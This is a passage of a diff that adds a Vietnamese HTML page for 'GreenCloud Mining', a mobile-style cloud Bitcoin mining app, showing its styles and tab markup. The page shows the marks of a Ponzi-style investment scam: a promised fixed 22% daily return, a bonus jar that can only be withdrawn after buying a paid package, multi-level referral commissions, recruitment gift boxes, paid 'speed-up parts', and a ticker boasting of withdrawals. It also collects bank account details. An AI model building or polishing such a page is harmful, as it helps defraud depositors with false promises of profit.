@@ -1,0 +1,2575 @@
+```html
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>GreenCloud Mining - Nền Tảng Khai Thác Bitcoin Đám Mây</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+      user-select: none;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      background-color: #030712;
+      color: #f1f5f9;
+      line-height: 1.5;
+      font-size: 13px;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+    }
+    .mono {
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+    }
+
+    /* Khung giả lập ứng dụng di động Native (App View max 500px) */
+    .app-viewport {
+      width: 100%;
+      max-width: 500px;
+      min-height: 100vh;
+      background-color: #0b1120;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      box-shadow: 0 0 50px rgba(0, 0, 0, 0.9);
+      border-left: 1px solid #1e293b;
+      border-right: 1px solid #1e293b;
+      padding-bottom: 78px;
+    }
+
+    /* Top App Header */
+    .app-header {
+      background: #0f172a;
+      border-bottom: 1px solid #1e293b;
+      padding: 12px 14px;
+      position: sticky;
+      top: 0;
+      z-index: 40;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .brand-box {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .brand-logo {
+      width: 36px;
+      height: 36px;
+      background: linear-gradient(135deg, #10b981, #059669);
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 900;
+      color: #070b14;
+      font-size: 19px;
+      box-shadow: 0 0 16px rgba(16, 185, 129, 0.45);
+    }
+    .brand-name {
+      font-size: 14px;
+      font-weight: 800;
+      color: #fff;
+      letter-spacing: 0.5px;
+    }
+    .brand-status {
+      font-size: 10px;
+      color: #10b981;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .status-dot {
+      width: 6px;
+      height: 6px;
+      background: #10b981;
+      border-radius: 50%;
+      box-shadow: 0 0 8px #10b981;
+      animation: pulseAnim 1.5s infinite;
+    }
+    @keyframes pulseAnim {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.35; transform: scale(0.85); }
+    }
+    .header-actions {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .audio-btn {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: #1e293b;
+      border: 1px solid #334155;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 13px;
+      cursor: pointer;
+    }
+    .auth-btn-pill {
+      background: #1e293b;
+      border: 1px solid #38bdf8;
+      color: #38bdf8;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 6px 12px;
+      border-radius: 20px;
+      cursor: pointer;
+      touch-action: manipulation;
+    }
+
+    /* Marquee News Strip */
+    .news-strip {
+      background: #020617;
+      border-bottom: 1px solid #1e293b;
+      padding: 6px 12px;
+      overflow: hidden;
+      white-space: nowrap;
+      font-size: 11px;
+      color: #94a3b8;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .news-badge {
+      background: #10b981;
+      color: #020617;
+      font-weight: 800;
+      padding: 1px 6px;
+      border-radius: 4px;
+      font-size: 9px;
+      flex-shrink: 0;
+    }
+    .news-marquee {
+      display: inline-block;
+      animation: marqueeAnim 28s linear infinite;
+    }
+    @keyframes marqueeAnim {
+      0% { transform: translateX(100%); }
+      100% { transform: translateX(-100%); }
+    }
+
+    /* Content Tabs & Cards */
+    .content-scroll {
+      padding: 14px;
+      flex: 1;
+    }
+    .tab-pane {
+      display: none;
+    }
+    .tab-pane.active {
+      display: block;
+      animation: fadeIn 0.2s ease-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(4px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .card {
+      background: #0f172a;
+      border: 1px solid #1e293b;
+      border-radius: 14px;
+      padding: 14px;
+      margin-bottom: 14px;
+      box-shadow: 0 4px 18px rgba(0, 0, 0, 0.35);
+    }
+    .card-title {
+      font-size: 12px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: #94a3b8;
+      margin-bottom: 10px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    /* Primary Balance Card */
+    .balance-card {
+      background: linear-gradient(135deg, #0f172a, #112035);
+      border: 1.5px solid #10b981;
+      position: relative;
+      overflow: hidden;
+    }
+    .balance-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 11px;
+      color: #94a3b8;
+    }
+    .balance-val {
+      font-size: 26px;
+      font-weight: 800;
+      color: #fff;
+      display: flex;
+      align-items: baseline;
+      gap: 4px;
+      margin: 4px 0;
+    }
+    .balance-val span.unit {
+      font-size: 14px;
+      color: #10b981;
+    }
+    .rate-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      background: rgba(16, 185, 129, 0.12);
+      border: 1px solid rgba(16, 185, 129, 0.35);
+      padding: 3px 9px;
+      border-radius: 8px;
+      font-size: 11px;
+      color: #34d399;
+      font-weight: 600;
+    }
+    .stats-2col {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin-top: 12px;
+      padding-top: 10px;
+      border-top: 1px solid #1e293b;
+    }
+    .stat-box {
+      font-size: 11px;
+    }
+    .stat-label {
+      color: #64748b;
+      margin-bottom: 2px;
+    }
+    .stat-number {
+      font-weight: 700;
+      color: #e2e8f0;
+      font-size: 12.5px;
+    }
+
+    /* Realtime Wave Canvas */
+    .canvas-wrap {
+      background: #020617;
+      border: 1px solid #1e293b;
+      border-radius: 10px;
+      padding: 8px;
+      margin-top: 12px;
+    }
+    .canvas-header {
+      display: flex;
+      justify-content: space-between;
+      font-size: 10.5px;
+      color: #64748b;
+      margin-bottom: 4px;
+    }
+    canvas#powerCanvas {
+      width: 100%;
+      height: 80px;
+      display: block;
+    }
+
+    /* Core Server Pulse */
+    .server-core {
+      background: #020617;
+      border: 1px solid #1e293b;
+      border-radius: 12px;
+      padding: 12px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-top: 12px;
+      position: relative;
+    }
+    .core-orb {
+      width: 42px;
+      height: 42px;
+      border-radius: 50%;
+      background: radial-gradient(circle, #059669 0%, #064e3b 70%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      box-shadow: 0 0 16px rgba(16, 185, 129, 0.4);
+      flex-shrink: 0;
+    }
+    .float-coin {
+      position: absolute;
+      right: 14px;
+      font-weight: 800;
+      color: #34d399;
+      font-size: 12px;
+      animation: floatEffect 1.8s infinite;
+    }
+    @keyframes floatEffect {
+      0% { opacity: 0; transform: translateY(6px); }
+      30% { opacity: 1; transform: translateY(-4px); }
+      100% { opacity: 0; transform: translateY(-18px); }
+    }
+
+    /* Quick 4 Grid Buttons */
+    .quick-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 8px;
+      margin-top: 12px;
+    }
+    .quick-btn {
+      background: #1e293b;
+      border: 1px solid #334155;
+      border-radius: 10px;
+      padding: 10px 4px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 4px;
+      color: #cbd5e1;
+      font-size: 10px;
+      font-weight: 600;
+      cursor: pointer;
+      touch-action: manipulation;
+    }
+    .quick-btn:active {
+      background: #334155;
+      transform: scale(0.96);
+    }
+    .quick-icon {
+      font-size: 18px;
+    }
+
+    /* Hardware Shop Grid */
+    .hw-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin-top: 8px;
+    }
+    .hw-item {
+      background: #020617;
+      border: 1px solid #1e293b;
+      border-radius: 10px;
+      padding: 10px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+
+    /* Packages Cards */
+    .package-card {
+      background: #0f172a;
+      border: 1px solid #1e293b;
+      border-radius: 14px;
+      margin-bottom: 14px;
+      overflow: hidden;
+      box-shadow: 0 4px 18px rgba(0, 0, 0, 0.4);
+    }
+    .package-card.owned {
+      border-color: #059669;
+      background: #0d1e28;
+    }
+    .package-img-box {
+      width: 100%;
+      height: 120px;
+      position: relative;
+      background: #020617;
+      overflow: hidden;
+    }
+    .package-img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+    .package-img-overlay {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(180deg, rgba(7, 11, 20, 0.1) 0%, rgba(15, 23, 42, 0.9) 100%);
+    }
+    .package-tag {
+      position: absolute;
+      top: 8px;
+      left: 8px;
+      background: rgba(15, 23, 42, 0.85);
+      border: 1px solid rgba(16, 185, 129, 0.5);
+      color: #34d399;
+      padding: 2px 7px;
+      border-radius: 5px;
+      font-size: 9.5px;
+      font-weight: 700;
+    }
+    .package-inner {
+      padding: 12px;
+    }
+
+    /* Badges */
+    .badge-pill {
+      background: #064e3b;
+      color: #34d399;
+      padding: 2px 8px;
+      border-radius: 12px;
+      font-size: 10px;
+      font-weight: 700;
+      border: 1px solid #059669;
+    }
+
+    /* Buttons */
+    .btn {
+      width: 100%;
+      padding: 10px 14px;
+      border-radius: 10px;
+      border: none;
+      font-size: 12px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      touch-action: manipulation;
+      transition: all 0.15s ease;
+    }
+    .btn:active {
+      transform: scale(0.97);
+    }
+    .btn-primary {
+      background: linear-gradient(135deg, #10b981, #059669);
+      color: #070b14;
+      box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
+    }
+    .btn-secondary {
+      background: #1e293b;
+      color: #f1f5f9;
+      border: 1px solid #334155;
+    }
+    .btn-blue {
+      background: linear-gradient(135deg, #0284c7, #0369a1);
+      color: #fff;
+      box-shadow: 0 4px 12px rgba(2, 132, 199, 0.3);
+    }
+    .btn-sm {
+      padding: 6px 12px;
+      font-size: 11px;
+      border-radius: 8px;
+      width: auto;
+    }
+
+    /* Bottom Navigation Bar */
+    .bottom-nav {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      max-width: 500px;
+      background: #0f172a;
+      border-top: 1px solid #1e293b;
+      display: flex;
+      justify-content: space-around;
+      padding: 7px 0;
+      z-index: 50;
+    }
+    .nav-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 2px;
+      color: #64748b;
+      font-size: 10px;
+      font-weight: 600;
+      cursor: pointer;
+      padding: 4px 10px;
+      border-radius: 8px;
+      touch-action: manipulation;
+    }
+    .nav-item.active {
+      color: #10b981;
+    }
+    .nav-icon {
+      font-size: 18px;
+    }
+
+    /* Modals System (Zero Touch Trap) */
+    .modal-backdrop {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.85);
+      display: none !important;
+      pointer-events: none !important;
+      visibility: hidden !important;
+      opacity: 0;
+      z-index: -1 !important;
+      align-items: center;
+      justify-content: center;
+      padding: 14px;
+      transition: opacity 0.2s ease;
+    }
+    .modal-backdrop.show {
+      display: flex !important;
+      pointer-events: auto !important;
+      visibility: visible !important;
+      opacity: 1 !important;
+      z-index: 9999 !important;
+    }
+    .modal-sheet {
+      background: #0f172a;
+      border: 1px solid #334155;
+      border-radius: 16px;
+      width: 100%;
+      max-width: 440px;
+      max-height: 90vh;
+      overflow-y: auto;
+      padding: 16px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
+    }
+    .modal-head {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+      border-bottom: 1px solid #1e293b;
+      padding-bottom: 8px;
+    }
+    .modal-title {
+      font-size: 13.5px;
+      font-weight: 700;
+      color: #fff;
+    }
+    .modal-close {
+      background: none;
+      border: none;
+      color: #64748b;
+      font-size: 20px;
+      cursor: pointer;
+      line-height: 1;
+      padding: 4px;
+    }
+
+    /* Inputs */
+    .input-group {
+      margin-bottom: 10px;
+    }
+    .input-label {
+      font-size: 11px;
+      color: #94a3b8;
+      margin-bottom: 3px;
+      display: block;
+    }
+    .input-control {
+      width: 100%;
+      background: #020617;
+      border: 1px solid #334155;
+      border-radius: 8px;
+      padding: 9px 12px;
+      color: #fff;
+      font-size: 13px;
+      outline: none;
+    }
+    .input-control:focus {
+      border-color: #38bdf8;
+    }
+    .input-control[readonly] {
+      background: #0b1728;
+      border-color: #0284c7;
+      color: #38bdf8;
+      cursor: not-allowed;
+    }
+
+    /* Distinct Notification Toasts (Nạp vs Rút) */
+    .distinct-toast {
+      position: fixed;
+      bottom: 74px;
+      left: 14px;
+      right: 14px;
+      max-width: 380px;
+      margin: 0 auto;
+      background: rgba(15, 23, 42, 0.96);
+      border-radius: 12px;
+      padding: 9px 12px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      z-index: 60;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.6);
+      transform: translateY(140px);
+      opacity: 0;
+      pointer-events: none;
+      transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+    .distinct-toast.active {
+      transform: translateY(0);
+      opacity: 1;
+    }
+    .distinct-toast.deposit {
+      border: 1.5px solid #10b981;
+    }
+    .distinct-toast.withdraw {
+      border: 1.5px solid #f59e0b;
+    }
+    .toast-orb {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 16px;
+      flex-shrink: 0;
+    }
+    .distinct-toast.deposit .toast-orb {
+      background: rgba(16, 185, 129, 0.2);
+    }
+    .distinct-toast.withdraw .toast-orb {
+      background: rgba(245, 158, 11, 0.2);
+    }
+
+    /* System Quick Toast */
+    #sysToast {
+      position: fixed;
+      top: 55px;
+      left: 50%;
+      transform: translateX(-50%) translateY(-20px);
+      background: #10b981;
+      color: #070b14;
+      font-weight: 700;
+      padding: 8px 18px;
+      border-radius: 20px;
+      font-size: 12px;
+      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.4);
+      z-index: 20000;
+      opacity: 0;
+      pointer-events: none;
+      transition: all 0.25s ease;
+    }
+    #sysToast.show {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
+    }
+  </style>
+</head>
+<body>
+
+  <div class="app-viewport">
+
+    <!-- Top Header -->
+    <header class="app-header">
+      <div class="brand-box">
+        <div class="brand-logo">G</div>
+        <div>
+          <div class="brand-name">GREENCLOUD MINING</div>
+          <div class="brand-status" id="headerMiningStatus"><span class="status-dot"></span> CHỜ ĐĂNG KÝ</div>
+        </div>
+      </div>
+      <div class="header-actions">
+        <div class="audio-btn" id="audioToggleBtn" onclick="window.toggleAudio()" title="Âm thanh">🔊</div>
+        <div class="auth-btn-pill mono" id="topAuthBtn" onclick="window.openAuthModal('login')">Đăng Nhập / Đăng Ký</div>
+      </div>
+    </header>
+
+    <!-- Marquee News Strip -->
+    <div class="news-strip">
+      <span class="news-badge">TIN TỨC</span>
+      <span class="news-marquee">Cụm máy đào hydro Singapore đạt hiệu suất 99.8% • Lãi suất khai thác 22%/ngày cộng dồn theo giây 24/7 • Chúc mừng thợ đào vừa rút 450.000 đ thành công! • Tặng ngay 20.000 đ vào Hũ Nâng Cấp khi tạo tài khoản!</span>
+    </div>
+
+    <!-- Main Content Tabs -->
+    <div class="content-scroll">
+
+      <!-- ==================== TAB 1: TRANG CHỦ ==================== -->
+      <div id="tabHome" class="tab-pane active">
+        
+        <!-- Primary Balance Card -->
+        <div class="card balance-card">
+          <div class="balance-header">
+            <span>VÍ THU NHẬP CHÍNH (CÓ THỂ RÚT)</span>
+            <span style="color:#10b981; font-weight:700;">LÃI 22%/NGÀY (THEO GIÂY)</span>
+          </div>
+          <div class="balance-val mono">
+            <span id="userBalanceText">0.0000</span> <span class="unit">đ</span>
+          </div>
+          <div class="rate-badge mono">
+            <span>⚡ Công suất:</span>
+            <span id="userYieldRateText">+0.0000 đ/s</span>
+          </div>
+
+          <div class="stats-2col">
+            <div class="stat-box">
+              <div class="stat-label">Ước tính ngày</div>
+              <div class="stat-number mono" id="statDailyEstimate">0.00 đ/ngày</div>
+            </div>
+            <div class="stat-box">
+              <div class="stat-label">Thu nhập hôm nay</div>
+              <div class="stat-number mono" id="statTodayEarned">0.00 đ</div>
+            </div>
+            <div class="stat-box">
+              <div class="stat-label">Ép xung linh kiện</div>
+              <div class="stat-number mono" id="statOverclockBuff">+0%</div>
+            </div>
+            <div class="stat-box">
+              <div class="stat-label">Tự tái đầu tư (76K)</div>
+              <div class="stat-number" id="statAutoCompound" style="color:#64748b;">Đang Tắt</div>
+            </div>
+          </div>
+
+          <!-- Realtime Power Wave Canvas -->
+          <div class="canvas-wrap">
+            <div class="canvas-header">
+              <span>SÓNG CÔNG SUẤT THỜI GIAN THỰC</span>
+              <span class="mono" id="canvasLiveTag" style="color:#64748b;">TẠM DỪNG</span>
+            </div>
+            <canvas id="powerCanvas" width="400" height="80"></canvas>
+          </div>
+
+          <!-- Core Server Status -->
+          <div class="server-core">
+            <div class="core-orb">⚡</div>
+            <div>
+              <div style="font-weight:700; color:#fff; font-size:12.5px;">Cụm Máy Chủ Điện Toán Cloud</div>
+              <div style="font-size:10.5px; color:#64748b;" id="serverCoreSub">Chờ tạo tài khoản kích hoạt</div>
+            </div>
+            <div class="float-coin mono" id="floatAmount">+0.000 đ</div>
+          </div>
+        </div>
+
+        <!-- MỤC RIÊNG BIỆT: HŨ TIỀN NÂNG CẤP -->
+        <div class="card" style="background:linear-gradient(135deg, #091e3a, #0b1728); border:1.5px solid #0284c7;">
+          <div class="card-title">
+            <span style="color:#38bdf8; display:flex; align-items:center; gap:5px;">💠 MỤC RIÊNG: HŨ TIỀN NÂNG CẤP</span>
+            <span class="badge-pill" id="upgradeWalletBadge" style="background:#451a03; color:#fcd34d; border-color:#d97706; font-size:9px;">CẦN GÓI ĐỂ RÚT VỀ VÍ</span>
+          </div>
+          <div style="display:flex; justify-content:space-between; align-items:baseline; margin:4px 0;">
+            <div>
+              <div style="font-size:10.5px; color:#94a3b8;">Số Dư Quỹ Nâng Cấp:</div>
+              <div class="mono" style="font-size:23px; font-weight:800; color:#fff;" id="upgradeBalanceHomeText">0 đ</div>
+            </div>
+            <div style="display:flex; gap:6px;">
+              <button class="btn btn-primary btn-sm" onclick="window.openTransferUpgradeModal()">Rút Về Ví Chính</button>
+              <button class="btn btn-blue btn-sm" onclick="window.openUpgradeDepositModal()">+ Nạp Hũ</button>
+            </div>
+          </div>
+          <div style="background:rgba(2, 132, 199, 0.12); border:1px dashed rgba(56, 189, 248, 0.4); border-radius:8px; padding:8px 10px; margin-top:8px; font-size:11px; color:#bae6fd; line-height:1.4;">
+            🎁 <b>Tặng sẵn:</b> <b>20.000 đ</b> vào Hũ ngay sau khi đăng ký tài khoản!<br>
+            🔓 <b>Rút về ví:</b> Rút toàn bộ tiền từ Hũ về Ví Chính bất kỳ lúc nào <u>ngay khi tài khoản đã kích hoạt ít nhất 1 gói trả phí (từ 76.000 đ trở lên)</u>.
+          </div>
+        </div>
+
+        <!-- Quick 4 Grid Buttons -->
+        <div class="quick-grid">
+          <div class="quick-btn" onclick="window.openOverclockModal()">
+            <span class="quick-icon">🚀</span>
+            <span>Ép Xung</span>
+          </div>
+          <div class="quick-btn" onclick="window.openVaultModal()">
+            <span class="quick-icon">🏦</span>
+            <span>Quỹ Khóa</span>
+          </div>
+          <div class="quick-btn" onclick="window.openInsuranceModal()">
+            <span class="quick-icon">🛡️</span>
+            <span>Bảo Hiểm</span>
+          </div>
+          <div class="quick-btn" onclick="window.toggleAutoCompound()">
+            <span class="quick-icon">🔄</span>
+            <span>Tái Lãi</span>
+          </div>
+        </div>
+
+        <!-- Chợ Phụ Kiện Tăng Tốc -->
+        <div class="card" style="margin-top:14px;">
+          <div class="card-title">
+            <span>🛠️ CHỢ PHỤ KIỆN TĂNG TỐC TRẠM ĐÀO</span>
+            <span style="font-size:10px; color:#38bdf8;">Trừ Hũ Nâng Cấp</span>
+          </div>
+          <p style="font-size:11px; color:#94a3b8; margin-bottom:8px;">
+            Nâng cấp linh kiện phụ trợ máy đào để tăng vĩnh viễn công suất khai thác. Thanh toán bằng số dư Hũ Nâng Cấp:
+          </p>
+
+          <div class="hw-grid">
+            <div class="hw-item">
+              <div>
+                <div style="font-weight:700; color:#fff; font-size:11.5px;">Quạt RGB Led Pro</div>
+                <div style="font-size:10px; color:#38bdf8; margin:2px 0 6px 0;">+3% Tốc độ đào</div>
+              </div>
+              <button class="btn btn-blue btn-sm" onclick="window.buyHwPart('fan_rgb', 15000, 3)">15.000 đ</button>
+            </div>
+            <div class="hw-item">
+              <div>
+                <div style="font-weight:700; color:#fff; font-size:11.5px;">Nguồn 1600W Titanium</div>
+                <div style="font-size:10px; color:#38bdf8; margin:2px 0 6px 0;">+6% Ổn định áp</div>
+              </div>
+              <button class="btn btn-blue btn-sm" onclick="window.buyHwPart('psu_1600', 35000, 6)">35.000 đ</button>
+            </div>
+            <div class="hw-item">
+              <div>
+                <div style="font-weight:700; color:#fff; font-size:11.5px;">Cáp Riser Mạ Vàng</div>
+                <div style="font-size:10px; color:#38bdf8; margin:2px 0 6px 0;">+8% Băng thông Bus</div>
+              </div>
+              <button class="btn btn-blue btn-sm" onclick="window.buyHwPart('gold_riser', 60000, 8)">60.000 đ</button>
+            </div>
+            <div class="hw-item">
+              <div>
+                <div style="font-weight:700; color:#fff; font-size:11.5px;">Buồng Khí Ni-tơ Lỏng</div>
+                <div style="font-size:10px; color:#38bdf8; margin:2px 0 6px 0;">+15% Siêu xung nhịp</div>
+              </div>
+              <button class="btn btn-blue btn-sm" onclick="window.buyHwPart('nitro_cool', 120000, 15)">120.000 đ</button>
+            </div>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- ==================== TAB 2: GÓI ĐẦU TƯ ==================== -->
+      <div id="tabPackages" class="tab-pane">
+        <div class="card">
+          <div class="card-title">
+            <span>DANH MỤC GÓI ĐIỆN TOÁN ĐÁM MÂY</span>
+          </div>
+          <p style="font-size:11.5px; color:#94a3b8; margin-bottom:12px;">
+            Tất cả các gói trả phí đều sinh lời cố định <b style="color:#10b981;">22%/ngày</b>, chia đều trả về ví từng giây 24/7.
+          </p>
+
+          <div id="packagesListWrap"></div>
+        </div>
+      </div>
+
+      <!-- ==================== TAB 3: HOẠT ĐỘNG ==================== -->
+      <div id="tabActivities" class="tab-pane">
+        <div class="card">
+          <div class="card-title">
+            <span>🎯 NHIỆM VỤ THỢ ĐÀO</span>
+          </div>
+
+          <div class="card" style="background:#020617; border-radius:10px; padding:10px; display:flex; justify-content:space-between; align-items:center;">
+            <div>
+              <div style="font-weight:700; color:#fff; font-size:12px;">Điểm danh mỗi ngày</div>
+              <div class="mono" style="font-size:11px; color:#10b981;">+500 đ vào ví chính</div>
+            </div>
+            <button class="btn btn-secondary btn-sm" id="btnDailyClaim" onclick="window.claimDailyTask()">Nhận</button>
+          </div>
+
+          <div id="inviteTasksList"></div>
+        </div>
+      </div>
+
+      <!-- ==================== TAB 4: ĐỘI NHÓM ==================== -->
+      <div id="tabTeam" class="tab-pane">
+        <div class="card">
+          <div class="card-title">
+            <span>CHƯƠNG TRÌNH HOA HỒNG ĐỐI TÁC</span>
+            <span style="color:#10b981;">F1: 7% • F2: 3%</span>
+          </div>
+
+          <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-bottom:12px;">
+            <div style="background:#020617; border:1px solid #1e293b; border-radius:10px; padding:10px; text-align:center;">
+              <div style="font-size:10.5px; color:#64748b;">Thành viên F1</div>
+              <div class="mono" style="font-size:18px; font-weight:800; color:#fff;" id="refF1Total">0 người</div>
+            </div>
+            <div style="background:#020617; border:1px solid #1e293b; border-radius:10px; padding:10px; text-align:center;">
+              <div style="font-size:10.5px; color:#64748b;">F1 Đã Nạp Tiền</div>
+              <div class="mono" style="font-size:18px; font-weight:800; color:#10b981;" id="refF1Paid">0 người</div>
+            </div>
+          </div>
+
+          <button class="btn btn-secondary btn-sm" style="width:100%; margin-bottom:12px;" onclick="window.openF1ListModal()">
+            👥 Xem Chi Tiết F1 Đã Nạp / Chưa Nạp
+          </button>
+
+          <div class="input-group">
+            <label class="input-label">LIÊN KẾT MỜI CỦA BẠN</label>
+            <div style="display:flex; gap:6px;">
+              <input type="text" class="input-control mono" id="refLinkInput" value="https://greencloud.vn/?ref=5829104821" readonly>
+              <button class="btn btn-secondary btn-sm" onclick="window.copyRefLink()">Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Hộp quà 2 ô -->
+        <div class="card">
+          <div class="card-title">
+            <span>🎁 HỘP QUÀ GIỚI THIỆU (2 Ô)</span>
+            <span class="mono" style="color:#f59e0b;" id="giftSpinsLeft">0 lượt mở</span>
+          </div>
+          <p style="font-size:11px; color:#94a3b8; margin-bottom:10px;">
+            Mỗi khi giới thiệu 1 bạn mới đăng ký, bạn nhận ngay 1 lượt mở. Hãy chọn 1 trong 2 hộp (35% trúng 1.000 đ):
+          </p>
+
+          <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
+            <div class="quick-btn" style="padding:14px;" onclick="window.openGiftBox(1)">
+              <div style="font-size:26px;">🎁</div>
+              <div style="font-weight:700; color:#fff;">HỘP SỐ 1</div>
+            </div>
+            <div class="quick-btn" style="padding:14px;" onclick="window.openGiftBox(2)">
+              <div style="font-size:26px;">🎁</div>
+              <div style="font-weight:700; color:#fff;">HỘP SỐ 2</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ==================== TAB 5: TÔI ==================== -->
+      <div id="tabProfile" class="tab-pane">
+        <div class="card">
+          <div style="display:flex; align-items:center; gap:12px; margin-bottom:12px;">
+            <div style="width:46px; height:46px; border-radius:50%; background:#1e293b; border:2px solid #10b981; display:flex; align-items:center; justify-content:center; font-size:20px;">
+              👤
+            </div>
+            <div>
+              <div style="font-size:15px; font-weight:700; color:#fff;" id="profileName">Chưa Đăng Nhập</div>
+              <div class="mono" style="font-size:11px; color:#64748b;" id="profileId">Tài khoản vãng lai</div>
+            </div>
+          </div>
+
+          <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-bottom:8px;">
+            <button class="btn btn-primary" onclick="window.openDepositModal()">💳 Nạp Gói Đào</button>
+            <button class="btn btn-secondary" onclick="window.openWithdrawModal()">🏧 Rút Tiền Ví</button>
+          </div>
+          <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
+            <button class="btn btn-blue" onclick="window.openUpgradeDepositModal()">💠 Nạp Hũ Nâng Cấp</button>
+            <button class="btn btn-primary" onclick="window.openTransferUpgradeModal()">🔄 Rút Hũ Về Ví</button>
+          </div>
+        </div>
+
+        <!-- Thẻ Ngân Hàng Mặc Định -->
+        <div class="card">
+          <div class="card-title">
+            <span>🏦 TÀI KHOẢN NGÂN HÀNG THỤ HƯỞNG</span>
+            <span style="font-size:10.5px; color:#38bdf8; cursor:pointer;" onclick="window.openBankSettingsModal()">SỬA ĐỔI</span>
+          </div>
+          <div style="background:#020617; border:1px solid #1e293b; border-radius:10px; padding:10px; font-size:11.5px;">
+            <div style="display:flex; justify-content:space-between; margin-bottom:4px;">
+              <span style="color:#94a3b8;">Ngân hàng:</span>
+              <b id="savedBankName" style="color:#fff;">Chưa thiết lập</b>
+            </div>
+            <div style="display:flex; justify-content:space-between; margin-bottom:4px;">
+              <span style="color:#94a3b8;">Số tài khoản:</span>
+              <b class="mono" id="savedBankAccount" style="color:#38bdf8;">Chưa có</b>
+            </div>
+            <div style="display:flex; justify-content:space-between;">
+              <span style="color:#94a3b8;">Chủ tài khoản:</span>
+              <b id="savedAccountName" style="color:#fff;">Chưa có</b>
+            </div>
+          </div>
+        </div>
+
+        <!-- Thẻ Bảo Mật PIN -->
+        <div class="card">
+          <div class="card-title">
+            <span>🔒 BẢO MẬT GIAO DỊCH (MÃ PIN 6 SỐ)</span>
+          </div>
+          <div style="display:flex; justify-content:space-between; align-items:center;">
+            <span style="font-size:11px; color:#94a3b8;">Trạng thái: <b id="pinStatusText" style="color:#ef4444;">Chưa kích hoạt</b></span>
+            <button class="btn btn-secondary btn-sm" onclick="window.openSetPinModal()">Cài Đặt / Đổi PIN</button>
+          </div>
+        </div>
+
+        <!-- Lịch Sử -->
+        <div class="card">
+          <div class="card-title">
+            <span>LỊCH SỬ GIAO DỊCH</span>
+          </div>
+          <div style="display:grid; grid-template-columns:repeat(3, 1fr); gap:6px;">
+            <button class="btn btn-secondary btn-sm" onclick="window.openHistoryModal('deposit')">📥 Nạp Gói</button>
+            <button class="btn btn-secondary btn-sm" onclick="window.openHistoryModal('upgrade')">💠 Nạp Hũ</button>
+            <button class="btn btn-secondary btn-sm" onclick="window.openHistoryModal('withdraw')">📤 Rút Tiền</button>
+          </div>
+        </div>
+
+        <!-- Hỗ trợ -->
+        <div class="card">
+          <div class="card-title">
+            <span>THÔNG TIN & HỖ TRỢ</span>
+          </div>
+          <div style="display:flex; flex-direction:column; gap:6px;">
+            <button class="btn btn-secondary btn-sm" onclick="window.openModal('modalIntro')">📖 Giới Thiệu Nền Tảng GreenCloud</button>
+            <button class="btn btn-secondary btn-sm" onclick="window.showToast('Kênh cộng đồng hỗ trợ trực tuyến: GreenCloud Global')">🌐 Kênh Cộng Đồng Khai Thác</button>
+            <button class="btn btn-secondary btn-sm" onclick="window.showToast('Tổng đài CSKH 24/7: support@greencloud.vn')">🎧 Trung Tâm CSKH 24/7</button>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Bottom Navigation Bar -->
